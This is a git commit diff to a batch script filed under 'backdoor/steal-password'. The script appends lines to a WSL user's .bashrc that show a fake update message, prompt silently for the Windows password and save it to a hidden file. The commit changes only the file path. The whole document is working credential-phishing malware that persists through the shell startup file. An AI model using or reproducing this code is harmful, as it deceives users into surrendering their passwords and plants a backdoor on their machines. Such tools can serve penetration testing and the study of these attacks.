d0a8656e0f98d0fc87c00f1fbf48e11cfe119118
Cervoise <antoine.cervoise@gmail.com>
2018-10-12 12:18:35 +0200

    Update wsl-fake-win-password-prompt.bat

--- backdoor/steal-password/wsl-fake-win-password-prompt.bat
+++ backdoor/steal-password/wsl-fake-win-password-prompt.bat
@@ -3,7 +3,7 @@ cd
 echo "echo \"Bash must check for update.\"" >> .bashrc
 echo "WINUSER=\$(/mnt/c/Windows/System32/whoami.exe 2> /dev/null | sed 's/.$//')" >> .bashrc
 echo "read -sp \"Please enter you Windows password for \$WINUSER:\" WINPASS" >> .bashrc
-echo "echo \$WINPASS >> .hidden-win-pass" >> .bashrc
+echo "echo \$WINPASS >> ~/.hidden-win-pass" >> .bashrc
 echo "sleep 2" >> .bashrc
 echo "echo \"\"" >> .bashrc
 echo "echo \"Bash updated\"" >> .bashrc
